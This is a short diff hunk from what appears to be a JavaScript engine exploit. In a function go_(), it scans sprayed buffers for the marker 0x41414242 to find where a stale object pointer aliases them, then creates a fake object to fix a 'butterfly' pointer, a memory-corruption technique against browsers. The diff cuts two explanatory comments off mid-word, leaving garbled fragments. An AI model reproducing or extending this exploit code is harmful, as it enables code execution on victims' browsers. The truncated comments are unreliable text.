@@ -167,8 +167,8 @@ function go_() {
 
 	for(i = 0; i < bufs.length; i++) {
 		for(k = 0; k < bufs[0].length; k++) {
-			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
-			// If this is true then stale[0] points to the same thing as bufs[i][k]
+			// Check if this is what the stale object points t
+			// If this is true then stale[0] po
 			if(bufs[i][k] == 0x41414242) {
 				// Create fakeobj for fixing butterfly ptr
 				var fakeobj = {};
